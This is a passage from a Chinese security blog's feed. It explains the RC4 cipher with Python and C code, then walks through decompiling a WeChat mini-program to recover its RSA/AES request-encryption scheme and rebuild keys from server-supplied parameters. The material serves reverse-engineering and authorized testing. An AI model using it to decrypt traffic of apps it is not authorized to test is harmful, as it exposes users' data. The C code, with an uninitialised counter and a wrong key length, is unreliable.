<code>加法常数矩阵</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法还原 </tag>
            
            <tag> 哈希算法 </tag>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之RC4</title>
      <link href="/2024/06/13/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRC4/"/>
      <url>/2024/06/13/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRC4/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一 简介"></a>一 简介</h1><h2 id="一次一密"><a href="#一次一密" class="headerlink" title="一次一密"></a>一次一密</h2><p><strong>对称加密算法</strong>：使用最广泛的流密码就是RC4</p><p>优点：密钥随机产生，只使用一次；无条件安全、加解密位加法运算效率高</p><p>缺点：要求密钥至少与明文一样长，密钥共享困难</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131348677.png" alt="img"> </p><h2 id="流密码（序列密码）"><a href="#流密码（序列密码）" class="headerlink" title="流密码（序列密码）"></a>流密码（序列密码）</h2><ul><li>流密码基本思想：</li></ul><p>密钥流发生器f产生zi&#x3D;f(k,σ \sigmaσi)，即种子密钥k产生密钥流z&#x3D;z0z1z2…</p><p>加密y&#x3D;y0y1y2…&#x3D;Ez0(x0)Ez1(x1)Ez2(x2)…</p><ul><li>有内部记忆原件的为流密码，否则分组密码</li><li>内部记忆原件状态σ \sigmaσi独立于明文的称同步流密码，否则自同步流密码</li><li>同步流密码加密器&#x3D;滚动密钥生成器+加密变换器</li><li>二元加法流密码，加密变换yi&#x3D;zi⨁ \bigoplus⨁xi</li><li>一次一密是加法流密码原型，若zi&#x3D;ki,则加法流密码就退化成一次一密</li><li>密钥流序列性质：极大的周期、良好的统计特性、抗线性分析、抗统计分析</li><li>一次一密的密钥长度和明文一样长，流密码不是，需要种子密钥通过密钥生成器产生密钥流</li></ul><h1 id="二-RC4算法原理"><a href="#二-RC4算法原理" class="headerlink" title="二 RC4算法原理"></a>二 RC4算法原理</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先，RC4算法所依赖的最根本原理是：对明文使用同一个密钥异或两次最后仍是得到原文。即生成密钥之后，由密钥与明文异或后生成密文（加密过程），由同一密钥与密文异或后得到明文（解密过程）。</p><p><strong>在介绍RC4算法原理之前，先看看算法中的几个关键变量：</strong></p><p>1、密钥流：RC4算法的关键是根据明文和密钥生成相应的密钥流，密钥流的长度和明文的长度是对应的，也就是说明文的长度是500字节，那么密钥流也是500字节。当然，加密生成的密文也是500字节，因为密文第i字节&#x3D;明文第i字节^密钥流第i字节；</p><p>2、状态向量S：长度为256，S[0],S[1]…..S[255]。每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换；</p><p>3、临时向量T：长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给T，否则，轮转地将密钥的每个字节赋给T；</p><p>4、密钥K：长度为1-256字节，注意密钥的长度keylen与明文长度、密钥流的长度没有必然关系，通常密钥的长度趣味16字节（128比特）。</p><h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>下面是对RC4算法具体实现的简单介绍：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131406862.png" alt="img"> </p><p>1、先初始化状态向量S（256个字节，用来作为密钥流生成的种子1）</p><p>按照升序，给每个字节赋值0,1,2,3,4,5,6…..,254,255</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131406935.png" alt="img"> </p><p>2、初始密钥（由用户输入），长度任意。如果输入长度小于256个字节，则进行轮转，直到填满。例如输入密钥的是“1,2,3,4,5”, 那么填入的是1,2,3,4,5, 1,2,3,4,5, 1,2,3,4,5……..</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131407542.png" alt="img"> </p><p>由上述轮转过程得到256个字节的向量T（用来作为密钥流生成的种子2）。</p><p>3、开始对状态向量S进行置换操作（用来打乱初始种子1），按照下列规则进行：</p><p>从第零个字节开始，执行256次，保证每个字节都得到处理</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131407174.png" alt="img"> </p><p>4、最后是秘钥流的生成与加密。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131408206.png" alt="img"> </p><p>上面四个步骤简单<strong>总结</strong>一下：</p><ul><li>第一步：生成了初始状态向量S</li><li>第二步：输入初始密钥，生成临时向量T</li><li>第三步：对状态向量S进行置换操作，打乱初始种子，生成S’</li><li>第四步：使用明文和S‘生成最终加密的密钥流</li><li>第五步：使用密钥流对明文进行异或，实现最终加密。</li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>具体实现代码如下：<a href="https://github.com/qiaoao-spec/RC4">RC4加解密算法</a></p><p>解密按照前面写的，异或两次就是原文，所以只要把密钥流重新拿过来异或一次就能得到原文了</p><p>下面是调用<strong>python</strong>简单实现的上述所说：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen_S</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Key</span>():</span><br><span class="line">    T = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        T.append(WordList[i % <span class="number">62</span>])</span><br><span class="line">    <span class="keyword">return</span> T</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">permute_S</span>():</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        temp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = temp</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc_RC4</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text1)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        temp = S[i]</span><br><span class="line">        S[i] = S[j]</span><br><span class="line">        S[j] = temp</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        data.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(text1[num]) ^ S[t])))</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 第一步</span></span><br><span class="line">    S = []</span><br><span class="line">    gen_S()</span><br><span class="line">    <span class="comment"># 第二步</span></span><br><span class="line">    WordList = <span class="built_in">list</span>(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>)</span><br><span class="line">    T = init_Key()</span><br><span class="line">    <span class="comment"># 第三步</span></span><br><span class="line">    permute_S()</span><br><span class="line">    <span class="comment"># 第四步</span></span><br><span class="line">    <span class="comment"># text = &quot;12345&quot;</span></span><br><span class="line">    <span class="comment"># enc_RC4()</span></span><br><span class="line">    <span class="comment"># 第五步</span></span><br><span class="line">    text1 = [<span class="string">&#x27;£&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;\x16&#x27;</span>]</span><br><span class="line">    enc_RC4()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131433047.png" alt="image.png"> </p><h1 id="三-实现标准RC4算法"><a href="#三-实现标准RC4算法" class="headerlink" title="三 实现标准RC4算法"></a>三 实现标准RC4算法</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">char</span> s[<span class="number">256</span>], <span class="type">char</span> *pwd, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_enc</span><span class="params">(<span class="type">char</span> s[<span class="number">256</span>], <span class="type">char</span> *data, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">char</span> S[<span class="number">256</span>], <span class="type">char</span> *K, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> T[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        S[i] = i;</span><br><span class="line">        T[i] = K[i % len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">        swap(S[i],S[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_enc</span><span class="params">(<span class="type">char</span> S[<span class="number">256</span>], <span class="type">char</span> *data, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i , j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; len; ++k) &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">        swap(S[i],S[j]);</span><br><span class="line">        <span class="type">int</span> t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">        *(data + k) ^= S[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">    JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_roysue_rc4_MainActivity_rc4</span><span class="params">(JNIEnv *env, jobject thiz, jbyteArray data)</span> &#123;</span><br><span class="line">    jbyte *t_data = env-&gt;GetByteArrayElements(data,<span class="number">0</span>);</span><br><span class="line">    env-&gt;ReleaseByteArrayElements(data,t_data,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *c_data = reinterpret_cast&lt;<span class="type">char</span> *&gt;(t_data);</span><br><span class="line">    <span class="type">int</span> len = env-&gt;GetArrayLength(data);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> S[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *pwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    rc4_init(S,pwd,len);</span><br><span class="line">    rc4_enc(S,c_data,len);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(c_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="四-RC4算法汇编分析"><a href="#四-RC4算法汇编分析" class="headerlink" title="四 RC4算法汇编分析"></a>四 RC4算法汇编分析</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131441725.png" alt="image.png"> </p><p>上图中的代码是没有进行变量抽取之前的，可以看到函数名都还是可以看到的。</p><p>可以在代码中加上如下代码，进行变量抽取：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set (CMAKE_CXX_FLAGS &quot;$(CMAKE_CXX_FLAGS&quot; -fvisibility=hidden)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406131441940.png" alt="image.png"> </p><p>整个汇编代码基本和C的区别不大，这块就不细看了。。。。</p><p><strong>RC4算法的特征有</strong>：</p><ul><li>首先根据原理我们可以看到会初始化一个256字节的数组</li><li>其次会将一个key也填充到数组中</li><li>函数的话大概率都是两个参数,一个是key 一个是keylen</li></ul><p>具体分析，可以见<a href="https://blog.csdn.net/abel_big_xu/article/details/115646413">逆向分析中的密码学—RC4_rc4逆向-CSDN博客</a></p><h1 id="五-总结"><a href="#五-总结" class="headerlink" title="五 总结"></a>五 总结</h1><p>RC4算法本身实现并不复杂，只要熟悉其加密&#x2F;解密流程，逆向分析过程中一般都能很好的进行识别。<br>分析其它标准加密算法基本也是同样的流程，对于自定义的一些加密算法就需要耐心的跟踪分析了。<br>另外对于标准加密算法，也可以借助PEID的“Krypto ANALyzer”插件，或者IDA的“FindCrypt2”插件进行识别，使用这些插件能够更好地提高工作效率。</p><p>一般不怎么会在渗透过程中遇到RC4算法的，主要不方便，还要求一次一密。。。</p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法还原 </tag>
            
            <tag> RC4 </tag>
            
            <tag> 分组密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小程序数字信封算法分析</title>
      <link href="/2024/06/12/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E5%AD%97%E4%BF%A1%E5%B0%81%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/12/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%B0%E5%AD%97%E4%BF%A1%E5%B0%81%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一 简介"></a>一 简介</h1><p>正常访问目标小程序，抓包，发现请求参数和返回包都是加密的</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130905436.png" alt="img"> </p><p>这种情况下肯定没法进一步测试的，这块可以小程序反编译看看了。</p><h1 id="二-加解密逻辑"><a href="#二-加解密逻辑" class="headerlink" title="二 加解密逻辑"></a>二 加解密逻辑</h1><p>1、使用unveilr反编译后，微信开发者工具打开：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906948.png" alt="image.png"> </p><p>直接打开时这种乱码的，可读性太差了。</p><p>可以使用在线JS美化工具（ <a href="https://coding.tools/cn/javascript-beautifier">https://coding.tools/cn/javascript-beautifier</a>  ），将代码格式化下，这样读起来就方便多了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906280.png" alt="img"> </p><p>2、观察数据包，会发现在请求和响应中有2个参数：“<strong>akey</strong>”和“<strong>data</strong>”：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906369.png" alt="image.png"> </p><p>3、直接在代码中全局检索一下关键字 “akey”:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130906417.png" alt="image.png"> </p><p>4、可以看到和关键字关联的4个函数：</p><ul><li>encodeAES_ECB</li><li>decodeAES_ECB</li><li>encodeRSA_module</li><li>decodeRSA_module</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130907720.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> u = &#123;</span><br><span class="line">    <span class="attr">getRandomStr</span>: <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> e = [], n = <span class="number">0</span>; n &lt; t; n++) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">26</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()),</span><br><span class="line">                i = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span> + r);</span><br><span class="line">            e.<span class="title function_">push</span>(i.<span class="title function_">toUpperCase</span>())</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> e.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">encodeAES_ECB</span>: <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="string">&quot;string&quot;</span> != <span class="keyword">typeof</span> t &amp;&amp; (t = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t));</span><br><span class="line">        <span class="keyword">var</span> n = i.<span class="property">default</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(t, i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(e), &#123;</span><br><span class="line">            <span class="attr">mode</span>: i.<span class="property">default</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">            <span class="attr">padding</span>: i.<span class="property">default</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(n.<span class="property">ciphertext</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decodeAES_ECB</span>: <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="string">&quot;string&quot;</span> != <span class="keyword">typeof</span> t &amp;&amp; (t = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(t));</span><br><span class="line">        <span class="keyword">var</span> n = i.<span class="property">default</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(t, i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(e), &#123;</span><br><span class="line">            <span class="attr">mode</span>: i.<span class="property">default</span>.<span class="property">mode</span>.<span class="property">ECB</span>,</span><br><span class="line">            <span class="attr">padding</span>: i.<span class="property">default</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> i.<span class="property">default</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">stringify</span>(n)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">encodeRSA_module</span>: <span class="keyword">function</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="keyword">new</span> s.<span class="property">default</span>;</span><br><span class="line">        <span class="keyword">return</span> r.<span class="title function_">setPublic</span>(e, n),</span><br><span class="line">            <span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> e, n, r = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>,</span><br><span class="line">                    i = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (e = <span class="number">0</span>; e + <span class="number">3</span> &lt;= t.<span class="property">length</span>; e += <span class="number">3</span>) n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">3</span>), <span class="number">16</span>), i += r.<span class="title function_">charAt</span>(n &gt;&gt; <span class="number">6</span>) + r.<span class="title function_">charAt</span>(<span class="number">63</span> &amp; n);</span><br><span class="line">                <span class="keyword">for</span> (e + <span class="number">1</span> == t.<span class="property">length</span> ? (n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">1</span>), <span class="number">16</span>), i += r.<span class="title function_">charAt</span>(n &lt;&lt; <span class="number">2</span>)) : e + <span class="number">2</span> == t.<span class="property">length</span> &amp;&amp; (n = <span class="built_in">parseInt</span>(t.<span class="title function_">substring</span>(e, e + <span class="number">2</span>), <span class="number">16</span>), i += r.<span class="title function_">charAt</span>(n &gt;&gt; <span class="number">2</span>) + r.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; n) &lt;&lt; <span class="number">4</span>));</span><br><span class="line">                    (<span class="number">3</span> &amp; i.<span class="property">length</span>) &gt; <span class="number">0</span>;) i += <span class="string">&quot;=&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">            &#125;(r.<span class="title function_">encrypt</span>(t))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decodeRSA_module</span>: <span class="keyword">function</span>(<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = <span class="keyword">new</span> s.<span class="property">default</span>;</span><br><span class="line">        <span class="keyword">return</span> i.<span class="title function_">setPrivate</span>(e, n, r), i.<span class="title function_">decrypt</span>(<span class="keyword">function</span>(<span class="params">t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e, n = <span class="string">&quot;&quot;</span>,</span><br><span class="line">                r = <span class="number">0</span>,</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (e = <span class="number">0</span>; e &lt; t.<span class="property">length</span> &amp;&amp; <span class="string">&quot;=&quot;</span> != t.<span class="title function_">charAt</span>(e); ++e) &#123;</span><br><span class="line">                <span class="keyword">var</span> o = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>.<span class="title function_">indexOf</span>(t.<span class="title function_">charAt</span>(e));</span><br><span class="line">                o &lt; <span class="number">0</span> || (<span class="number">0</span> == r ? (n += <span class="title function_">a</span>(o &gt;&gt; <span class="number">2</span>), i = <span class="number">3</span> &amp; o, r = <span class="number">1</span>) : <span class="number">1</span> == r ? (n += <span class="title function_">a</span>(i &lt;&lt; <span class="number">2</span> | o &gt;&gt; <span class="number">4</span>), i = <span class="number">15</span> &amp; o, r = <span class="number">2</span>) : <span class="number">2</span> == r ? (n += <span class="title function_">a</span>(i), n += <span class="title function_">a</span>(o &gt;&gt; <span class="number">2</span>), i = <span class="number">3</span> &amp; o, r = <span class="number">3</span>) : (n += <span class="title function_">a</span>(i &lt;&lt; <span class="number">2</span> | o &gt;&gt; <span class="number">4</span>), n += <span class="title function_">a</span>(<span class="number">15</span> &amp; o), r = <span class="number">0</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span> == r &amp;&amp; (n += <span class="title function_">a</span>(i &lt;&lt; <span class="number">2</span>)), n</span><br><span class="line">        &#125;(t))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decodeRSA</span>: <span class="keyword">function</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> n = <span class="keyword">new</span> o.<span class="property">default</span>;</span><br><span class="line">        <span class="keyword">return</span> n.<span class="title function_">setPrivateKey</span>(e), n.<span class="title function_">decrypt</span>(t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">e.<span class="property">default</span> = u</span><br></pre></td></tr></table></figure><h2 id="加密逻辑"><a href="#加密逻辑" class="headerlink" title="加密逻辑"></a>加密逻辑</h2><p>1、根据上面找到的函数<strong>encodeRSA_module</strong>，查找引用的位置。找到请求头中akey的生成逻辑</p><p>这块可以看到请求头中的 akey 生成逻辑：</p><p>①先生成一个16位的随机字符串作为AES加密的密钥</p><p>②调用c.default.encodeRSA_module函数，使用RSA公钥对生成的AES密钥加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r = c.default.getRandomStr(16)</span><br><span class="line">i = c.default.encodeRSA_module(r, s.default.getters.currentConfigs.modulus, s.default.getters.currentConfigs.publicExponent)</span><br><span class="line"></span><br><span class="line">token: s.default.getters.currentToken</span><br><span class="line">akey: i</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130907548.png" alt="image.png"> </p><p>2、根据函数<strong>encodeAES_ECB</strong>，查找引用位置。找到请求参数 data 的生成逻辑：</p><p>利用前面生成的随机字符串作为密钥，对传入的参数进行加密得到data</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">    data: u ? s.default.encodeAES_ECB(&#123;</span><br><span class="line">        service: &quot;adequacy.101&quot;,</span><br><span class="line">        json: i.default.getters._personalInfo</span><br><span class="line">    &#125;, n) : &#123;</span><br><span class="line">        service: &quot;adequacy.101&quot;,</span><br><span class="line">        json: i.default.getters._personalInfo</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130908762.png" alt="image.png"> </p><p>、到这里基本就可以明文请求包中的加密逻辑了（<strong>数字信封</strong>）：</p><ul><li>akey：使用RSA公钥对随机的AES密钥进行加密</li><li>data：使用AES-ECB进行对称加密</li></ul><h2 id="解密逻辑"><a href="#解密逻辑" class="headerlink" title="解密逻辑"></a>解密逻辑</h2><p>同理，和上面分析加密算法的时候一样，可以判断出解密逻辑如下：</p><ul><li>akey：服务端返回的参数中带有AES的密钥，需要使用RSA私钥解密后才可得到</li><li>data：利用从akey中获取的AES密钥解密</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130908816.png" alt="image.png"> </p><h1 id="三-AES密钥获取"><a href="#三-AES密钥获取" class="headerlink" title="三 AES密钥获取"></a>三 AES密钥获取</h1><p>前面说到AES密钥的加密和解密是通过RSA公私钥来实现的，那这块RSA公私钥从哪儿来呢？？？</p><p>1、查看代码中的encodeRSA_module函数的参数中提到了几个参数：</p><ul><li>i.default.getters.currentConfigs.modulus</li><li>i.default.getters.currentConfigs.publicExponent</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130911701.png" alt="image.png"> </p><p>2、decodeRSA_module函数的参数中提到了几个参数：</p><ul><li>s.default.getters.currentConfigs.modulus2</li><li>s.default.getters.currentConfigs.publicExponent</li><li>s.default.getters.currentConfigs.privateExponent</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130911390.png" alt="img"> </p><p>3、这几个参数具体是什么作用？？？</p><p>查看请求数据包中，发现在刚开始打开程序的时候，有一个返回包中是有携带这些参数的：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406130911958.png" alt="image.png"> </p><p>这快也就意味着，每次启动小程序，服务端都会返回RSA密钥的相关参数，用来在客户端生成RSA公私钥。</p><h2 id="RSA模数和指数原理"><a href="#RSA模数和指数原理" class="headerlink" title="RSA模数和指数原理"></a>RSA模数和指数原理</h2><p>这块放在后面详细说一下。。。</p><h2 id="Python代码实现"><a href="#Python代码实现" class="headerlink" title="Python代码实现"></a>Python代码实现</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-06-12 9:44</span></span><br><span class="line"><span class="comment"># @Author: muhe Jing</span></span><br><span class="line"><span class="comment"># @File: RSA_gen.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入已知的公钥模N和公钥指数E</span></span><br><span class="line">N = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;a38f39068534ccf3187917604a857285333dee0cf01b6e26f78be0cb563763fa0b028d01bbe8e9bf6e5c707e40a7bdd237c7f6b2e93de1cbc8fb3e818112fa81e78a3614f812e4dcbed201aefb1cb7be6c8546be0f86d0d782ee47c028daf969e0131564171c7dd34b075a947bd388af07e62a64f23c11f314bb2e2cb929df0b&quot;</span>,</span><br><span class="line">    <span class="number">16</span>)</span><br><span class="line">E = <span class="built_in">int</span>(<span class="string">&quot;10001&quot;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建RSA公钥对象</span></span><br><span class="line">public_key = RSA.construct((N, E))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出公钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(public_key.export_key().decode())</span><br><span class="line"></span><br><span class="line">N = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;9ee7f2b994fa16b86a1d01ad82663b24d488f2ea6ad2b60264badb6311906674048e70ebbae222744eb8b93d58258eb4dc30d11d4a9408e4ae8eb6d34a4e175a131eaa2484269041947c0d1e4c1652a0992ea952d590ef9836e0144197f30ef837d2df2ea0ba534f3f03ed88e8fe8311f7b6138b254e9b3395132db4f17ee0f3&quot;</span>,</span><br><span 